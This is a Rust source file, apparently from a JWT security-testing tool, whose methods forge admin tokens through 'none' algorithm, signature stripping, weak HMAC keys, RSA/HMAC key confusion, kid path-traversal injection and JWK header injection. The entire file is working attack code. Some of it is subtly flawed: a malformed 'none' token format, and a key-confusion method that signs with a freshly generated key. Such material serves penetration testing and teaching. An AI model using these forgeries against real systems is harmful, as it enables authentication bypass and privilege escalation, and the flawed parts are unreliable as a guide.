use crate::constants::JWT_COMMON;
use crate::{error::JWTAnalyzerError, JWTExploiter};
use crate::types::ExploitResult;
use rand::rngs::OsRng;
use serde_json::json;
use base64::{encode_config, URL_SAFE_NO_PAD};
use hmac::{Hmac, Mac};
use sha2::Sha256;
use rsa::{pkcs1::EncodeRsaPublicKey, RsaPrivateKey, RsaPublicKey, traits::PublicKeyParts};
use rsa::pkcs1v15::SigningKey;
use signature::{Signer, SignatureEncoding};

impl JWTExploiter {
    pub async fn forge_none_algorithm(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);

        let header = json!({
            "typ": "JWT",
            "alg": "none"
        });

        let header_b64 = encode_config(serde_json::to_string(&header)
            .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);
        let payload_b64 = encode_config(serde_json::to_string(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);

        Ok(ExploitResult {
            forged_token: format!("{}.{}..", header_b64, payload_b64),
            technique: "Algorithm None".to_string(),
            description: "Forged token using 'none' algorithm bypass".to_string(),
            success: true,
        })
    }

    pub async fn forge_stripped_signature(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let parts: Vec<&str> = self.original_token.split('.').collect();
        if parts.len() != 3 {
            return Err(JWTAnalyzerError::InvalidFormat);
        }

        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);

        let payload_b64 = encode_config(serde_json::to_string(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);

        Ok(ExploitResult {
            forged_token: format!("{}.{}.", parts[0], payload_b64),
            technique: "Signature Stripping".to_string(),
            description: "Forged token by stripping signature and modifying payload".to_string(),
            success: true,
        })
    }

    pub async fn forge_with_weak_key(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        // Read weak keys from the embedded file, split by newlines and filter empty lines
        let weak_keys: Vec<&str> = JWT_COMMON
            .lines()
            .filter(|line| !line.trim().is_empty())
            .collect();
    
        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);
    
        // Try each weak key from the embedded list
        for key in weak_keys {
            let header = json!({
                "typ": "JWT",
                "alg": "HS256"
            });
    
            let header_b64 = encode_config(
                serde_json::to_string(&header)
                    .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?
                    .as_bytes(), 
                URL_SAFE_NO_PAD
            );
            
            let payload_b64 = encode_config(
                serde_json::to_string(&payload)
                    .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?
                    .as_bytes(), 
                URL_SAFE_NO_PAD
            );
    
            let message = format!("{}.{}", header_b64, payload_b64);
            
            // Try to create HMAC with the current weak key
            if let Ok(mut mac) = Hmac::<Sha256>::new_from_slice(key.as_bytes()) {
                mac.update(message.as_bytes());
                let signature = mac.finalize().into_bytes();
                let signature_b64 = encode_config(&signature[..], URL_SAFE_NO_PAD);
    
                return Ok(ExploitResult {
                    forged_token: format!("{}.{}.{}", header_b64, payload_b64, signature_b64),
                    technique: "Weak HMAC Key".to_string(),
                    description: format!("Forged token using common weak HMAC key: {}", key),
                    success: true,
                });
            }
        }
    
        Err(JWTAnalyzerError::SignatureVerification)
    }

    pub async fn forge_key_confusion(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut rng = OsRng;
        let private_key = RsaPrivateKey::new(&mut rng, 2048)
            .map_err(|_| JWTAnalyzerError::KeyFormat("Failed to generate RSA key".into()))?;
        let public_key = RsaPublicKey::from(&private_key);

        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);

        let header = json!({
            "typ": "JWT",
            "alg": "HS256",
            "kid": "public-key-1"
        });

        let header_b64 = encode_config(serde_json::to_string(&header)
            .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);
        let payload_b64 = encode_config(serde_json::to_string(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);

        let pub_key_der = public_key.to_pkcs1_der()
            .map_err(|_| JWTAnalyzerError::KeyFormat("Failed to encode public key".into()))?;

        let message = format!("{}.{}", header_b64, payload_b64);
        let mut mac = Hmac::<Sha256>::new_from_slice(pub_key_der.as_bytes())
            .map_err(|_| JWTAnalyzerError::SignatureVerification)?;
        mac.update(message.as_bytes());
        let signature = mac.finalize().into_bytes();
        let signature_b64 = encode_config(&signature[..], URL_SAFE_NO_PAD);

        Ok(ExploitResult {
            forged_token: format!("{}.{}.{}", header_b64, payload_b64, signature_b64),
            technique: "Key Confusion Attack".to_string(),
            description: "Forged token using RSA/HMAC key confusion vulnerability".to_string(),
            success: true,
        })
    }

    pub async fn forge_kid_injection(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);

        let header = json!({
            "typ": "JWT",
            "alg": "HS256",
            "kid": "../../../../../../dev/null"
        });

        let header_b64 = encode_config(serde_json::to_string(&header)
            .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);
        let payload_b64 = encode_config(serde_json::to_string(&payload)
            .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(), 
            URL_SAFE_NO_PAD);

        let message = format!("{}.{}", header_b64, payload_b64);
        let mut mac = Hmac::<Sha256>::new_from_slice(&[0u8; 32])
            .map_err(|_| JWTAnalyzerError::SignatureVerification)?;
        mac.update(message.as_bytes());
        let signature = mac.finalize().into_bytes();
        let signature_b64 = encode_config(&signature[..], URL_SAFE_NO_PAD);

        Ok(ExploitResult {
            forged_token: format!("{}.{}.{}", header_b64, payload_b64, signature_b64),
            technique: "KID Injection".to_string(),
            description: "Forged token using KID header injection with path traversal".to_string(),
            success: true,
        })
    }

    pub async fn forge_jwk_injection(&self) -> Result<ExploitResult, JWTAnalyzerError> {
        let mut rng = OsRng;
        let private_key = RsaPrivateKey::new(&mut rng, 2048)
            .map_err(|_| JWTAnalyzerError::KeyFormat("Failed to generate RSA key".into()))?;
        let public_key = RsaPublicKey::from(&private_key);
        
        let mut payload = self.payload.clone();
        payload["role"] = json!("admin");
        payload["admin"] = json!(true);
        
        let jwk = json!({
            "kty": "RSA",
            "kid": "attacker-key-1",
            "use": "sig",
            "n": base64::encode(public_key.n().to_bytes_be()),
            "e": base64::encode(public_key.e().to_bytes_be())
        });
        
        let header = json!({
            "typ": "JWT",
            "alg": "RS256",
            "jwk": jwk
        });
    
        let header_b64 = encode_config(
            serde_json::to_string(&header)
                .map_err(|e| JWTAnalyzerError::HeaderManipulation(e.to_string()))?.as_bytes(),
            URL_SAFE_NO_PAD
        );
        
        let payload_b64 = encode_config(
            serde_json::to_string(&payload)
                .map_err(|e| JWTAnalyzerError::PayloadManipulation(e.to_string()))?.as_bytes(),
            URL_SAFE_NO_PAD
        );
        
        let message = format!("{}.{}", header_b64, payload_b64);

        // Updated signing code
        let signing_key = SigningKey::<Sha256>::try_from(private_key)
            .map_err(|_| JWTAnalyzerError::SignatureVerification)?;

        // The sign method returns a Signature directly, no need for map_err here
        let signature = signing_key.sign(message.as_bytes());

        // Convert the signature to bytes and encode
        let signature_b64 = encode_config(signature.to_bytes(), URL_SAFE_NO_PAD);
        Ok(ExploitResult {
            forged_token: format!("{}.{}.{}", header_b64, payload_b64, signature_b64),
            technique: "JWK Injection".to_string(),
            description: "Forged token by injecting attacker's JWK into header".to_string(),
            success: true,
        })
    }

}